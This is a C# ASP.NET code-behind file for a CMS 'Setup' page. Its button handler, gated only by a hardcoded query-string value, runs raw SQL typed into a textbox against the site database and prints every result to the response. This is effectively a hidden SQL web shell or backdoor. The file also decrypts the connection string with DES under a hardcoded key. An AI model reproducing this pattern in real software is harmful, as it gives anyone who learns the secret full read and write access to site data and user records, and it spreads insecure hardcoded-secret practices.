using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;
using System.Text;
using TG.ExpressCMS.Utilities;
using System.Data.SqlClient;
using System.Configuration;
using System.Security.Cryptography;

namespace TG.ExpressCMS.UserPages
{
    public partial class Setup : System.Web.UI.Page
    {
        //protected void Page_Load(object sender, EventArgs e)
        //{

        //    string[] files = Directory.GetFiles(Server.MapPath("~/Upload/Files/"), "*.mp3");
        //    for (int i = 0; i < files.Count(); i++)
        //    {
        //        writeFile(files[i].Substring(files[i].LastIndexOf('\\') + 1, files[i].Length - files[i].LastIndexOf('\\') - 1));
        //    }
        //}
        //private void writeFile(string filename)
        //{
        //    FileStream _file = File.Create(Server.MapPath("~/Upload/Files/" + filename.Replace(".mp3", "") + ".m3u"));
        //    _file.Write(Encoding.ASCII.GetBytes(CacheContext._DefaultSettings.DefaultUrl + "/Upload/Files/" + filename), 0, Encoding.ASCII.GetBytes(CacheContext._DefaultSettings.DefaultUrl + "/Upload/Files/" + filename).Count());
        //    _file.Close();
        //    _file.Dispose();
        //}
        protected override void OnInit(EventArgs e)
        {
            base.OnInit(e);
            this.Load += new EventHandler(Setup_Load);
            this.btnRun.Click += new EventHandler(btnRun_Click);
        }

        void btnRun_Click(object sender, EventArgs e)
        {
            if (Request.QueryString["Validate"] == null)
                return;
            if ((Request.QueryString["Validate"] != "YahiaAlhami"))
            {
                return;
            }
            SqlCommand _command = new SqlCommand();
            _command.CommandText = txtDetails.Text;
            _command.CommandType = System.Data.CommandType.Text;
            SqlConnection _connec = new SqlConnection();
            _connec.ConnectionString = (Decrypt(ConfigurationManager.ConnectionStrings["MyDb"].ConnectionString));
            _command.Connection = _connec;


            _connec.Open();
            SqlDataReader _reader = _command.ExecuteReader();
            while (_reader.Read())
            {
                for (int i = 0; i < _reader.FieldCount; i++)
                {
                    Response.Write(_reader[i].ToString());
                }

            }

            _connec.Close();
        }
        public static string Decrypt(string cryptedString)
        {
            if (String.IsNullOrEmpty(cryptedString))
            {
                throw new ArgumentNullException
                   ("The string which needs to be decrypted can not be null.");
            }
            DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
            MemoryStream memoryStream = new MemoryStream
                    (Convert.FromBase64String(cryptedString));
            CryptoStream cryptoStream = new CryptoStream(memoryStream,
                cryptoProvider.CreateDecryptor(Encoding.ASCII.GetBytes("ZeroCool"), Encoding.ASCII.GetBytes("ZeroCool")), CryptoStreamMode.Read);
            StreamReader reader = new StreamReader(cryptoStream);
            return reader.ReadToEnd();
        }
        void Setup_Load(object sender, EventArgs e)
        {

        }
    }
}